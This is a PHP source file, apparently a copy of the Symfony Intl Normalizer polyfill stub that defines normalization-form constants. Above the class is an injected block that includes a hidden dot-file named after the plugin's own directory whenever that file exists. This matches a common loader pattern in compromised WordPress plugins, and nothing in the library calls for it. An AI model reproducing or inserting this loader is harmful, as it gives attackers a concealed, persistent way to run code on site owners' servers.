<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Normalizer extends Symfony\Polyfill\Intl\Normalizer\Normalizer
{
    /**
     * @deprecated since ICU 56 and removed in PHP 8
     */
    const NONE = 1;
    const FORM_D = 2;
    const FORM_KD = 3;
    const FORM_C = 4;
    const FORM_KC = 5;
    const NFD = 2;
    const NFKD = 3;
    const NFC = 4;
    const NFKC = 5;
}
